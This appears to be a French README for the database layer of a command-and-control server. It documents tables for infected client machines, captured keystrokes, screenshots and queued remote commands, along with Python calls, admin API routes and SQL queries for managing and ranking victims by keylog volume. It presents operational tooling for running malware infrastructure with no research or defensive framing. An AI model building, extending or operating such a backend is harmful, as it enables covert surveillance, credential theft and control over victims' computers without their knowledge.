# 🗄️ Base de Données - Documentation

## 📊 Architecture de la Base de Données

La base de données SQLite stocke **toutes les activités** du serveur C2 avec les tables suivantes :

### 📋 Tables

#### 1. **clients** - Machines infectées
| Colonne | Type | Description |
|---------|------|-------------|
| id | Integer | ID auto-incrémenté |
| client_id | String(100) | ID unique du client (UUID) |
| ip_address | String(50) | Adresse IP |
| hostname | String(100) | Nom de la machine |
| username | String(100) | Utilisateur actuel |
| platform | String(50) | OS (Windows/Linux) |
| platform_version | String(100) | Version de l'OS |
| architecture | String(50) | Architecture (x64/x86) |
| first_seen | DateTime | Première connexion |
| last_seen | DateTime | Dernière activité |
| checkin_count | Integer | Nombre de heartbeats |
| online | Boolean | Statut en ligne |
| system_info | JSON | Informations système complètes |

#### 2. **heartbeats** - Battements de cœur
| Colonne | Type | Description |
|---------|------|-------------|
| id | Integer | ID auto-incrémenté |
| client_id | String(100) | FK vers clients |
| timestamp | DateTime | Horodatage du heartbeat |

#### 3. **commands** - Historique des commandes
| Colonne | Type | Description |
|---------|------|-------------|
| id | Integer | ID auto-incrémenté |
| command_id | String(100) | ID unique de la commande |
| client_id | String(100) | FK vers clients |
| action | String(100) | Type de commande |
| data | JSON | Paramètres de la commande |
| status | String(50) | pending/sent/completed/failed |
| created_at | DateTime | Date de création |
| sent_at | DateTime | Date d'envoi |
| completed_at | DateTime | Date de complétion |
| result | JSON | Résultat de la commande |
| error | Text | Message d'erreur si échec |

#### 4. **keylogs** - Frappes clavier
| Colonne | Type | Description |
|---------|------|-------------|
| id | Integer | ID auto-incrémenté |
| client_id | String(100) | FK vers clients |
| timestamp | DateTime | Horodatage de la frappe |
| window | String(500) | Fenêtre active |
| keystroke | String(100) | Touche pressée |

#### 5. **screenshots** - Captures d'écran
| Colonne | Type | Description |
|---------|------|-------------|
| id | Integer | ID auto-incrémenté |
| client_id | String(100) | FK vers clients |
| timestamp | DateTime | Horodatage |
| width | Integer | Largeur |
| height | Integer | Hauteur |
| quality | Integer | Qualité JPEG |
| size_kb | Float | Taille en KB |
| file_path | String(500) | Chemin du fichier |
| data | Text | Image en Base64 (optionnel) |

#### 6. **events** - Journaux d'événements
| Colonne | Type | Description |
|---------|------|-------------|
| id | Integer | ID auto-incrémenté |
| client_id | String(100) | FK vers clients |
| event_type | String(50) | Type d'événement |
| description | Text | Description |
| data | JSON | Données supplémentaires |
| timestamp | DateTime | Horodatage |
| severity | String(20) | info/warning/error/critical |

### 🔗 Relations
- **clients** → **heartbeats** (1:N)
- **clients** → **commands** (1:N)
- **clients** → **keylogs** (1:N)
- **clients** → **screenshots** (1:N)
- **clients** → **events** (1:N)

## 🛠️ Utilisation de la DatabaseManager

```python
from database import DatabaseManager

# Initialisation
db = DatabaseManager()  # Par défaut: sqlite:///c2_server.db

# Opérations Clients
client = db.get_or_create_client(client_id, system_info, ip_address)
clients = db.get_all_clients()
db.update_client_heartbeat(client_id)

# Opérations Commandes
db.create_command(command_id, client_id, action, data)
commands = db.get_pending_commands(client_id)
db.update_command_result(command_id, result)
result = db.get_command_result(command_id)

# Opérations Keylogs
db.save_keylogs(client_id, logs)
keylogs = db.get_keylogs(client_id, limit=100)
count = db.get_keylogs_count(client_id)

# Journalisation d'événements
db.log_event(client_id, 'register', 'Client registered', data, 'info')
events = db.get_events(client_id=client_id, event_type='error', limit=50)

# Statistiques
stats = db.get_statistics()
# Retourne: total_clients, online_clients, total_commands, 
#          pending_commands, total_keylogs, total_events

# Nettoyage
db.cleanup_old_data(days=30)  # Supprime données > 30 jours
```

## 📡 Nouvelles Routes API

### GET /admin/events
Récupère les événements du serveur
```bash
# Tous les événements
curl http://localhost:5000/admin/events

# Événements d'un client
curl http://localhost:5000/admin/events?client_id=xxx

# Par type
curl http://localhost:5000/admin/events?event_type=error

# Avec limite
curl http://localhost:5000/admin/events?limit=50
```

### GET /admin/commands_history
Récupère l'historique des commandes
```bash
# Toutes les commandes
curl http://localhost:5000/admin/commands_history

# Commandes d'un client
curl http://localhost:5000/admin/commands_history?client_id=xxx
```

### GET /admin/status
Statistiques complètes du serveur
```json
{
  "status": "online",
  "total_clients": 5,
  "online_clients": 3,
  "total_commands": 150,
  "pending_commands": 2,
  "total_keylogs": 5420,
  "total_events": 890,
  "server_time": "2026-01-29T...",
  "uptime_seconds": 3600
}
```

## 🔧 Configuration

### Changer la base de données
```python
# PostgreSQL
db = DatabaseManager('postgresql://user:pass@localhost/c2_db')

# MySQL
db = DatabaseManager('mysql://user:pass@localhost/c2_db')

# SQLite (par défaut)
db = DatabaseManager('sqlite:///c2_server.db')
```

## 📈 Types d'événements enregistrés

| event_type | Description |
|------------|-------------|
| register | Client enregistré |
| disconnect | Client déconnecté |
| command_created | Commande créée |
| command_completed | Commande réussie |
| command_failed | Commande échouée |
| keylogs_received | Keylogs reçus |
| error | Erreur système |

## 🗑️ Nettoyage automatique

Le serveur lance automatiquement un thread de nettoyage qui :
- Supprime les heartbeats > 30 jours
- Supprime les événements > 30 jours
- S'exécute une fois par jour

## 💾 Fichier de la base

- **Emplacement** : `c2_server.db` (racine du projet)
- **Format** : SQLite3
- **Taille** : Croît avec l'activité

### Voir la base de données
```bash
# Installer SQLite Browser
# Ou utiliser sqlite3 CLI
sqlite3 c2_server.db
.tables
.schema clients
SELECT * FROM clients;
```

## 🔐 Sécurité

⚠️ **Important** :
- La base de données contient des **données sensibles**
- Ne jamais commit `c2_server.db` dans Git
- Ajouter `*.db` dans `.gitignore`
- Chiffrer la base pour la production

## 🚀 Avantages

✅ **Persistance** : Données conservées après redémarrage
✅ **Historique** : Traçabilité complète
✅ **Analyse** : Requêtes SQL puissantes
✅ **Évolutivité** : Passage facile à PostgreSQL/MySQL
✅ **Backup** : Copie simple du fichier .db

## 📊 Exemple de requêtes SQL

```sql
-- Clients les plus actifs
SELECT client_id, checkin_count, hostname 
FROM clients 
ORDER BY checkin_count DESC 
LIMIT 10;

-- Commandes échouées
SELECT command_id, client_id, action, error 
FROM commands 
WHERE status = 'failed'
ORDER BY created_at DESC;

-- Keylogs par client
SELECT client_id, COUNT(*) as log_count 
FROM keylogs 
GROUP BY client_id 
ORDER BY log_count DESC;

-- Événements critiques
SELECT * FROM events 
WHERE severity = 'critical' 
ORDER BY timestamp DESC;
```
